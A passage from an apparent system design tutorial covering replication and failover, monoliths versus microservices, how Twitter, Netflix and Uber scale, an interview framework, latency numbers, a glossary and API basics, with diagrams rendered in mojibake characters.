â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
1. App writes to Primary
2. Primary writes to disk
3. Primary immediately says "Done!" to App
4. Primary sends data to Replica in background (best effort)

     App â”€â”€â–º Primary â”€â”€â–º confirms immediately
                  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º
             Sends to replica later, asynchronously

âœ… Fast writes. Primary not slowed by replica.
âŒ Tiny window where replica is behind (called "replication lag").
âŒ If Primary crashes before replicating, last few writes are lost.
```

---

### What happens when the Primary dies?

This is called **failover**. The system needs to promote one of the replicas to become the new primary.

```
Normal state:                         After Primary dies:
Primary â”€â”€â–º Replica 1                 âŒ Primary is dead
        â”€â”€â–º Replica 2                 Replica 1 nominated as new Primary
        â”€â”€â–º Replica 3                 Replica 1 â”€â”€â–º Replica 2
                                                â”€â”€â–º Replica 3

Automatic failover (e.g. in AWS RDS):
  - Primary stops responding
  - Health checks detect it within seconds
  - A replica is automatically promoted
  - DNS is updated to point to new Primary
  - Total downtime: 30-60 seconds

Manual failover:
  - Someone gets paged at 2am
  - They log in, assess, decide which replica to promote
  - They manually run the promotion commands
  - Total downtime: minutes to hours
```

---

## 15. Microservices vs Monolith â€” one big thing or many small things?

This is one of the most debated topics in software engineering, and the honest answer is: **both have their place**.

---

### The Monolith â€” start here

A monolith is one codebase, deployed as one unit, talking to one database.

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                     Monolith                                     â”‚
â”‚                                                                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”          â”‚
â”‚  â”‚ User Module  â”‚  â”‚ Order Module â”‚  â”‚Search Module â”‚          â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜          â”‚
â”‚         â”‚                 â”‚                  â”‚                   â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”          â”‚
â”‚  â”‚ Auth Module  â”‚  â”‚Payment Moduleâ”‚  â”‚ Email Module â”‚          â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜          â”‚
â”‚         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                  â”‚
â”‚                            â”‚                                     â”‚
â”‚               â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                       â”‚
â”‚               â”‚      One Database       â”‚                       â”‚
â”‚               â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                      One deployment unit
                      One codebase
                      One repository
```

**It's actually great when you're small:**

- Easy to run locally â€” just one `npm start`
- Easy to understand â€” everything is in one place
- Easy to debug â€” no network calls between modules, just function calls
- Works fine at small to medium scale

**It falls apart when you grow:**

- 50 engineers all changing one codebase â†’ constant merge conflicts
- One module's bug can crash the entire app
- "We need to scale the search feature" â†’ you have to scale the _entire_ monolith
- Deploy is all or nothing â€” a small fix requires deploying everything

---

### Microservices â€” split by business domain

Each service is its own independent app: separate codebase, separate database, separate deployment, separate team.

```mermaid
graph TB
    GW["ðŸšª API Gateway"]

    GW --> US["ðŸ‘¤ User Service\n\nOwns user data\nNode.js + PostgreSQL\nTeam A"]
    GW --> OS["ðŸ“¦ Order Service\n\nOwns order data\nPython + MongoDB\nTeam B"]
    GW --> PS["ðŸ’³ Payment Service\n\nOwns payment data\nJava + MySQL\nTeam C"]
    GW --> NS["ðŸ”” Notification Service\n\nSends emails/push\nGo + Redis\nTeam D"]
    GW --> SS["ðŸ” Search Service\n\nSearch index\nElasticsearch\nTeam E"]

    OS -->|"'order placed' event"| MQ["ðŸ“¬ Message Queue"]
    MQ --> PS
    MQ --> NS
    PS -->|"'payment done' event"| MQ
    MQ --> NS
```

**The benefits:**

- Each service deploys independently â€” fix a bug in payments without touching search
- Each service scales independently â€” payments getting slow? Scale only that
- Teams own their service fully â€” no stepping on each other
- Technology freedom â€” use the best tool for each job

**The cost:**

- Network calls between services add latency and failure risk
- A request might touch 5 services â€” debugging requires tracing across all 5
- Data consistency across services is hard (no single DB to ACID across)
- Much more infrastructure to manage (50 services = 50 CI/CD pipelines)

---

### The honest guide to choosing

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                                                                  â”‚
â”‚  Team size < 15 engineers?                                       â”‚
â”‚          â”‚                                                       â”‚
â”‚  YES â”€â”€â”€â”€â”¤â”€â”€â–º Start with monolith. 100%.                        â”‚
â”‚          â”‚    Microservices will slow you down, not help you.    â”‚
â”‚          â”‚                                                       â”‚
â”‚  Team 15-50?                                                     â”‚
â”‚          â”‚                                                       â”‚
â”‚  YES â”€â”€â”€â”€â”¤â”€â”€â–º Modular monolith.                                  â”‚
â”‚          â”‚    Well-structured monolith with clear module          â”‚
â”‚          â”‚    boundaries. When those boundaries hurt,            â”‚
â”‚          â”‚    extract one service at a time.                     â”‚
â”‚          â”‚                                                       â”‚
â”‚  Team 50+ and specific pain?                                     â”‚
â”‚          â”‚                                                       â”‚
â”‚  YES â”€â”€â”€â”€â”´â”€â”€â–º Extract services for the parts that are:          â”‚
â”‚               - Scaling differently from the rest               â”‚
â”‚               - Deployed 10x more often than the rest           â”‚
â”‚               - Owned by a dedicated team                       â”‚
â”‚               - Genuinely independent                           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

> Amazon famously runs hundreds of microservices. They also started as a monolith and grew into it over years. They didn't start with microservices on day one.

---

## 16. Real World Examples â€” how the big apps actually work

### How Twitter / X handles 500 million tweets per day

The core problem is the **fan-out problem**: When Elon Musk (200M followers) tweets, 200 million people's feeds potentially need updating.

```mermaid
graph LR
    T["âœï¸ Tweet created\nby celebrity"]
    TS["Tweet Service\nSaves tweet to DB\nAssigns tweet ID"]
    FS["Fan-out Service\nLooks up all followers"]
    Q["ðŸ“¬ Message Queue\n'Write tweet:123\nto user:X timeline'\n\n200M messages\nqueued up"]
    TW["âš™ï¸ Timeline Workers\n(many parallel)\nWrite to each\nfollower's cache"]
    TC["âš¡ Timeline Cache\n(one per user)\nPre-computed feed"]
    R["Read Service\nAssembles timeline\nfrom cache"]
    F["ðŸ“± Followers\nopen Twitter"]

    T --> TS
    TS --> FS
    FS --> Q
    Q --> TW
    TW --> TC
    F --> R
    R --> TC
```

**The tricky design decision â€” Push vs Pull:**

```
Push (Fan-out on write):
  When tweet is posted â†’ immediately write to every follower's timeline cache
  âœ… Reading feed is instant (just read cache)
  âŒ Celebrity with 200M followers = 200M cache writes per tweet
  âŒ Slow to post if you have many followers

Pull (Fan-out on read):
  When tweet is posted â†’ just save the tweet
  When user opens app â†’ compute their feed on the fly
  âœ… Posting is instant
  âŒ Opening feed requires checking every person you follow â†’ slow

Twitter's actual solution: HYBRID
  Regular users (< ~10K followers) â†’ Push. Pre-compute their fans' timelines.
  Celebrities (> ~10K followers) â†’ Pull. Too expensive to fan-out.
  When you open your feed: pre-computed timeline + fetch celebrity tweets live, merge.
```

---

### How Netflix serves video to 260 million subscribers

The hard part: video files are enormous (4K film = 100+ GB). You can't serve them from one server. You can't even serve them from one country.

```
What happens when you press Play on "Stranger Things":

1. Browser â†’ API Gateway
   Authenticated? What plan are you on? What quality can you get?

2. API Gateway â†’ Playback Service
   "Here is the manifest file: a list of video chunks at each quality"

3. Your Netflix app reads the manifest:
   "There are 3000 chunks. Each 2 seconds of video.
    Available in 4K, 1080p, 720p, 480p."

4. App checks your bandwidth: "You're getting 20 Mbps"
   Picks: 1080p quality. Requests first 10 chunks.

5. Chunks are fetched from CDN server CLOSEST to you (Open Connect)
   Netflix has their own CDN nodes installed in ISPs worldwide.
   Your ISP has Netflix content cached locally.

6. Every 30 seconds: app measures actual throughput
   "Bandwidth dropped to 5 Mbps"  â†’ switches to 720p automatically
   "Bandwidth jumped to 50 Mbps"  â†’ switches to 4K automatically

The result: no buffering, automatic quality adjustment.
```

```
Netflix encoding pipeline (before a show even goes live):
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
Raw video file (one episode)
         â”‚
         â–¼
Encoding farm (thousands of servers running parallel)
  - 4K HDR (60 Mbps)
  - 4K SDR (20 Mbps)
  - 1080p (8 Mbps)
  - 720p  (4 Mbps)
  - 480p  (2 Mbps)
  - 360p  (1 Mbps)
  Ã— multiple audio languages
  Ã— multiple subtitle tracks
  Ã— multiple codecs (H.264, H.265, AV1)
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
100+ encoded versions per episode!

All stored in S3 (object storage)
Then pushed to CDN edge nodes worldwide
```

---

### How Uber matches 5 million rides per day

The hard part: both the rider and driver are moving. Location data from millions of drivers pours in every 4 seconds.

```mermaid
sequenceDiagram
    participant R as ðŸ“± Rider App
    participant GW as API Gateway
    participant LS as Location Service
    participant MS as Matching Service
    participant DA as ðŸ“± Driver App

    Note over DA,LS: Every 4 seconds, constantly:
    DA->>LS: My location: 51.507Â°N, 0.127Â°W

    Note over R,GW: Rider requests a ride:
    R->>GW: "I need a ride. I'm at [location]"
    GW->>MS: Find available drivers near [location]
    MS->>LS: "Give me all drivers within 2km of [location]"
    LS-->>MS: [Driver A: 0.4km, Driver B: 0.9km, Driver C: 1.5km, ...]
    MS->>MS: Score drivers (distance + rating + car type)
    MS->>DA: "New ride request from rider at [location]"
    DA-->>MS: "Accepted"
    MS-->>GW: Matched with Driver A
    GW-->>R: "Driver arriving in 4 minutes. Blue Toyota, XYZ123"

    Note over R,DA: Ride in progress:
    loop Every 4 seconds
        DA->>LS: Updated location
        LS->>R: Show driver location on map
    end
```

**How the geospatial search works:**

The location service needs to answer _"who is within 2km of this point?"_ millions of times per second. Standard databases are terrible at this. Uber uses a technique called **geohashing**:

```
Geohash: divide the world into a grid
  Each grid cell has a string code.
  Nearby locations have similar code prefixes.

  Location: 51.507Â°N, 0.127Â°W
  Geohash:  gcpvh3  (6-character code)

  Finding nearby drivers:
  â†’ Find all drivers whose geohash starts with "gcpvh"
  â†’ This is a simple string prefix search â€” database index handles it instantly
  â†’ All matching drivers are within ~2.4km of the requested location

  This turns "find nearby things" into "find things with similar string"
  which any database can do extremely fast.
```

---

## 17. The System Design Interview Playbook

System design interviews test whether you can think through building a real system â€” not whether you memorise every detail. They want to see your thought process.

### The 5-step framework

```mermaid
flowchart LR
    S1["Step 1\nðŸŽ¯ CLARIFY\n5 minutes\n\nAsk questions before\nyou start designing"]
    S2["Step 2\nðŸ“ ESTIMATE\n3 minutes\n\nBack-of-envelope math\nto understand scale"]
    S3["Step 3\nðŸ—ºï¸ HIGH LEVEL\n10 minutes\n\nDraw the boxes and arrows.\nWalk through a full request."]
    S4["Step 4\nðŸ”¬ DEEP DIVE\n15 minutes\n\nGo deep on the hard parts."]
    S5["Step 5\nâš ï¸ EDGE CASES\n5 minutes\n\nWhat breaks?\nHow do you recover?"]

    S1 --> S2 --> S3 --> S4 --> S5
```

---

### Step 1 â€” The questions you MUST ask before drawing anything

_Never start designing without clarifying scope. Interviewers often leave requirements vague on purpose to see if you clarify._

```
Scope:
  "What are the top 3 features we're designing for?"
  "Are we designing the whole system or one specific part?"

Scale:
  "How many daily active users?"
  "How many requests per second at peak?"
  "How much data are we storing? GB? TB? PB?"

Constraints:
  "Is this read-heavy or write-heavy?"
  "Does it need to be globally available?"
  "What's the latency requirement? Sub-100ms?"

Consistency:
  "Is it okay to show slightly stale data?"
  "Example: is it okay if a user sees their new profile pic
   with 5 seconds delay, or must it be instant?"
```

---

### Step 2 â€” Back-of-envelope math

You don't need exact numbers. You need order-of-magnitude estimates to guide decisions.

```
Example: "Design Instagram"

Given: 1 billion users, 100M daily active, 50M new photos/day

Requests per second:
  100M DAU, average 10 page loads/day = 1B requests/day
  1B / 86,400 seconds = ~11,500 req/sec
  Peak (10x): ~115,000 req/sec  â†’  Need serious infrastructure

Storage for photos:
  50M new photos/day Ã— 2MB average = 100TB/day
  Per year: 36.5 PB  â†’  Need distributed object storage (S3)
  Can't fit on one machine. Need CDN for delivery.

Database reads:
  Photos are viewed far more than uploaded.
  Assume 100x read:write ratio.
  50M uploads â†’ 5B reads/day â†’ Cache the popular ones!
```

---

### Step 3 â€” The high level diagram

Draw this first, then walk through it:

```
1. Client (browser/mobile)
2. DNS â†’ CDN (for static assets)
3. Load Balancer
4. API Gateway (auth, routing, rate limiting)
5. Application Servers (your main logic)
6. Cache (Redis) â€” in front of DB
7. Primary Database
8. Replicas (for read scale)
9. Object Storage (images/videos)
10. Message Queue (background jobs)
11. Worker Servers
```

---

### Step 4 â€” Deep dive areas to focus on

These are the areas most often probed in interviews:

```
Database Design:
  - What tables/collections? What columns?
  - What are the access patterns? (mostly reads? writes? both?)
  - What needs indexes?

API Design:
  - What endpoints? POST /tweets, GET /feed/:userId
  - What does each accept and return?

The Hard Problem:
  Every system design question has ONE hard problem.
  Find it and go deep.

  Twitter â†’ fan-out to millions of followers
  Uber    â†’ real-time geospatial matching
  YouTube â†’ video encoding and distribution
  WhatsApp â†’ message delivery guarantees
  Pastebin â†’ unique URL generation at scale
```

---

### Quick problem â†’ solution reference

| You hear this problem                        | Reach for this                       |
| -------------------------------------------- | ------------------------------------ |
| "Server is overwhelmed"                      | Horizontal scaling + Load balancer   |
| "Database queries are slow"                  | Add Redis cache in front of it       |
| "Database can't hold all the data"           | Sharding                             |
| "One machine dying takes everything down"    | Replication + failover, redundancy   |
| "Users in other countries have high latency" | CDN + edge servers / multi-region    |
| "Users wait too long for heavy operations"   | Message queue + async workers        |
| "Same data fetched millions of times"        | Cache it (browser, CDN, or Redis)    |
| "Managing 50 services is chaos"              | API Gateway + service mesh           |
| "One client is abusing the API"              | Rate limiting                        |
| "Debugging across services is impossible"    | Distributed tracing (Jaeger, Zipkin) |
| "Need to see what's happening in real time"  | Centralised logging (ELK stack)      |
| "Write throughput maxed out"                 | CQRS + event sourcing, or sharding   |

---

## 18. Key Numbers Every Designer Should Know

These numbers come up constantly. You don't need to memorise exact values, just order of magnitude.

```
STORAGE:
â”â”â”â”â”â”â”
1 byte    = one character
1 KB      = 1,000 bytes    â‰ˆ a short text message
1 MB      = 1,000 KB       â‰ˆ a photo (compressed), 1 minute of audio
1 GB      = 1,000 MB       â‰ˆ a movie (compressed)
1 TB      = 1,000 GB       â‰ˆ 1,000 movies
1 PB      = 1,000 TB       â‰ˆ what large companies store in a day

SPEED OF OPERATIONS (know these cold):
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
L1 cache (on CPU chip)          0.5 ns    "instant"
L2 cache (near CPU)               7 ns    "instant"
RAM read                        100 ns    still very fast
SSD read                        150 Âµs    1,500x slower than RAM
Network, same datacenter        0.5 ms    slow-ish
HDD seek                         10 ms    very slow
Network, cross-continent        150 ms    painfully slow
Network, cross-ocean            300 ms    very painful

THE KEY INSIGHT:
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
RAM is ~1,500 times faster than SSD
SSD is ~70 times faster than HDD
Same datacenter network ~ SSD
Cross-continent network = nightmare

â†’ Cache = serve from RAM instead of SSD/DB
â†’ CDN = serve from nearby instead of cross-continent
```

| What                            | Approximate |
| ------------------------------- | ----------- |
| Read 1MB from RAM               | 0.25 ms     |
| Read 1MB from SSD               | 1 ms        |
| Read 1MB from HDD               | 20 ms       |
| Redis GET operation             | < 1 ms      |
| DB query (cached plan, indexed) | 1-5 ms      |
| DB query (cold, full scan)      | 100-5000 ms |
| HTTP req (same city CDN)        | 10-30 ms    |
| HTTP req (cross-continent)      | 150-300 ms  |

---

## 19. Glossary

A plain-English definition of every term used in system design:

| Term                     | What it actually means                                                                             |
| ------------------------ | -------------------------------------------------------------------------------------------------- |
| **Latency**              | How long one request takes from start to finish. "High latency" = slow.                            |
| **Throughput**           | How many requests your system handles per second. "High throughput" = handles lots.                |
| **Scalability**          | Can your system handle 10x more load by adding resources?                                          |
| **Availability**         | Is your system up and responding? Measured as a % of time.                                         |
| **Reliability**          | Does your system do what it's supposed to do, consistently?                                        |
| **Durability**           | If you save data, does it stay saved even after crashes?                                           |
| **Consistency**          | Do all nodes/users see the same data at the same time?                                             |
| **Eventual consistency** | Data will be consistent across all nodes... but maybe not immediately.                             |
| **Redundancy**           | Having backup components so one failure doesn't kill everything.                                   |
| **Failover**             | Automatic switch from a failed component to its backup.                                            |
| **SPOF**                 | Single Point of Failure â€” one thing whose death kills the whole system.                            |
| **Stateless**            | Server has no memory of previous requests. Each request contains everything needed.                |
| **Idempotent**           | Doing the same operation multiple times gives same result. Safe to retry.                          |
| **Horizontal scaling**   | Add more machines (scale out).                                                                     |
| **Vertical scaling**     | Make existing machine bigger (scale up).                                                           |
| **Sharding**             | Split data across multiple DB machines. Each holds a different slice.                              |
| **Replication**          | Copy the SAME data to multiple machines. Different shards.                                         |
| **Cache hit**            | Requested data found in cache. Fast.                                                               |
| **Cache miss**           | Requested data NOT in cache. Had to go to DB. Slow.                                                |
| **Cache invalidation**   | Deciding when to delete or update cached data because the source changed.                          |
| **TTL**                  | Time To Live â€” how long something is valid before expiring.                                        |
| **Fan-out**              | One event causing writes to many places (e.g. one tweet â†’ many timelines).                         |
| **Hot spot**             | One shard/server getting way more traffic than others.                                             |
| **Rate limiting**        | Capping how many requests a client can make in a time window.                                      |
| **Backpressure**         | Signal from an overwhelmed component to its upstream to slow down.                                 |
| **SLA**                  | Service Level Agreement â€” the uptime % you promise customers.                                      |
| **SLO**                  | Service Level Objective â€” internal target for uptime/performance.                                  |
| **P99 latency**          | 99th percentile latency â€” "99% of requests complete within this time".                             |
| **CDN**                  | Content Delivery Network â€” global servers that cache your static content closer to users.          |
| **Edge server**          | A server physically close to the end user. CDN nodes are edge servers.                             |
| **Origin server**        | Your main server. CDNs fetch from origin when they don't have a cached copy.                       |
| **Partition**            | A network split between nodes that can't communicate with each other.                              |
| **Consensus**            | Multiple distributed nodes agreeing on one value (very hard problem).                              |
| **Leader election**      | Choosing one node to be the "primary" / "leader" in a cluster.                                     |
| **Circuit breaker**      | Stops calling a failing service and fails fast instead of waiting. Prevents cascade failures.      |
| **Saga pattern**         | A way to handle distributed transactions across microservices without a global lock.               |
| **CQRS**                 | Command Query Responsibility Segregation â€” separate reads and writes into different models.        |
| **Event sourcing**       | Store all changes as events rather than just the current state.                                    |
| **Bloom filter**         | Probabilistic data structure: "Is this item definitely NOT in the set?" Used for cache pre-checks. |
| **Consistent hashing**   | A way to distribute load across servers so adding/removing servers only affects a small % of data. |

---

## 20. Single Server Setup â€” where every system starts

Before load balancers, databases clusters, and CDNs â€” every system starts with one machine doing everything.

### What a single server looks like

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    Your One Server                       â”‚
â”‚                                                          â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚  Web Server (Nginx / Apache)                     â”‚   â”‚
â”‚  â”‚  Listens on port 80/443, handles HTTP requests   â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                            â†•                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚  Application Code (Node.js / Python / Java)      â”‚   â”‚
â”‚  â”‚  Your business logic â€” figures out what to do    â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                            â†•                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚  Database (PostgreSQL / MySQL / MongoDB)          â”‚   â”‚
â”‚  â”‚  Stores all your data on the same disk           â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                          â”‚
â”‚     Everything lives on ONE machine                      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                       â†‘
              All user traffic
```

### A request hitting a single server

```mermaid
sequenceDiagram
    participant U as ðŸ‘¤ User (Browser)
    participant DNS as ðŸŒ DNS
    participant S as ðŸ–¥ï¸ Single Server
    participant DB as ðŸ—„ï¸ Database (on same machine)

    U->>DNS: "What IP is myapp.com?"
    DNS-->>U: "It's 123.45.67.89"
    U->>S: GET /homepage
    S->>DB: SELECT articles FROM posts LIMIT 10
    DB-->>S: Here's the data
    S-->>U: Here's the HTML page
```

### Why it's great when you're starting out

```
âœ… Dead simple â€” one machine, one bill, one place to look
âœ… Fast to set up â€” no architecture decisions needed
âœ… Easy to debug â€” everything is right there
âœ… Cheap â€” a basic cloud VM costs Â£5â€“20/month
âœ… No network hops between components â†’ very fast response times
```

### When it starts to crack

```
10 users       â†’ Runs perfectly fine
1,000 users    â†’ A bit slow during busy periods
10,000 users   â†’ CPU maxed out, pages timing out
100,000 users  â†’ Server crashes regularly under load

But even before performance, there are two structural problems:

Problem 1: SINGLE POINT OF FAILURE
  If this one machine goes down (power cut, hardware failure,
  bad software deploy) â†’ your entire app is dead.
  No backup. No fallback. Just down.

Problem 2: DATA IS AT RISK
  Your database is on the same machine as your app.
  If the disk fails â†’ you lose everything.
  No replication. No backups (unless you set them up separately).

Problem 3: CAN'T SCALE SMARTLY
  If only your database is slow, you can't scale just that.
  You have to scale the whole machine â€” it's all one unit.
```

> **This is why the rest of system design exists** â€” solving these three problems as your app grows.

---

### The evolution path: single server â†’ production system

```
Stage 1: Single server          Stage 2: Separate the DB
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”              â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ App + DB       â”‚    â”€â”€â”€â”€â”€â”€â–º   â”‚ App Server   â”‚   â”‚ DB Server â”‚
â”‚ (one machine)  â”‚              â”‚              â”‚â”€â”€â–ºâ”‚           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Stage 3: Add a cache            Stage 4: Scale horizontally
â”Œâ”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”            â”Œâ”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”
â”‚ App   â”‚  â”‚ Cache â”‚            â”‚  LB  â”‚ â”€â”€â”€â”€â”€â”€â–º â”‚ App  â”‚ â”‚ App  â”‚
â”‚       â”‚â”€â–ºâ”‚(Redis)â”‚â”€â”€â–º DB      â”‚      â”‚          â”‚  1   â”‚ â”‚  2   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”˜            â””â”€â”€â”€â”€â”€â”€â”˜          â””â”€â”€â”¬â”€â”€â”€â”˜ â””â”€â”€â”¬â”€â”€â”€â”˜
                                                      â””â”€â”€â–º DB â—„â”˜
```

---

## 21. API Design â€” the contract between systems

### What even is an API?

**API** stands for Application Programming Interface. Ignore the jargon. The concept is simple.

Think of a restaurant. You don't go into the kitchen and cook your own food. You look at the **menu**, order something, and a waiter brings it. The menu is the API â€” it's a defined list of things you can request, in a specific format, and you'll get a specific thing back.

```
The Restaurant Analogy:

You                  Waiter (API)              Kitchen (Server)
  â”‚                       â”‚                          â”‚
  â”œâ”€ "Can I get a burger?" â–º                          â”‚
  â”‚                       â”œâ”€â”€â”€ tells kitchen â”€â”€â”€â”€â”€â”€â”€â”€â–ºâ”‚
  â”‚                       â”‚                           â”‚
  â”‚                       â”‚â—„â”€â”€â”€ burger is ready â”€â”€â”€â”€â”€â”€â”¤
  â”‚â—„â”€â”€ Here's your burger â”¤                           â”‚
```

In software:

- **You** = a mobile app, website, or another service
- **The menu** = API documentation (what you can ask for)
- **The waiter** = the API (the defined interface)
- **The kitchen** = the server doing the actual work

---

### HTTP methods â€” the verbs of APIs

```
GET     â†’ "Give me something (read only, no side effects)"
          Example: GET /users/42  â†’  return user 42's profile

POST    â†’ "Create something new"
          Example: POST /orders  â†’  place a new order

PUT     â†’ "Replace this entirely"
          Example: PUT /users/42  â†’  replace the entire user record

PATCH   â†’ "Update just part of this"
          Example: PATCH /users/42  â†’  update just the email field

DELETE  â†’ "Remove this"
          Example: DELETE /users/42  â†’  delete user 42
```

---

### HTTP status codes â€” what the server says back

```
2xx â€” Success
  200 OK              â†’ Standard success
  201 Created         â†’ Resource was successfully created
